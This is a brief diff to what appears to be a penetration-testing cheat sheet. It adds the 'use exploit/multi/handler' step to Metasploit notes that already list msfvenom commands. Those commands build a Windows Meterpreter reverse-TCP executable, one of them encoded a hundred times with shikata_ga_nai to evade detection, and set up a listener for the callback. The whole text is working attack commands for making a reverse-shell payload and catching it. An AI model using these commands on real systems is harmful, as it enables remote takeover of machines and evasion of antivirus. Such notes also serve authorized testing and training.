@@ -10,6 +10,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f e
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOURIP LPORT=YOURPORT -e x64/shikata_ga_nai -i 100 -f exe > file.exe
 
 [Handler]
+msf5 > use exploit/multi/handler
 msf5 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
 PAYLOAD => windows/x64/meterpreter/reverse_tcp
 msf5 exploit(multi/handler) > set LHOST eth0
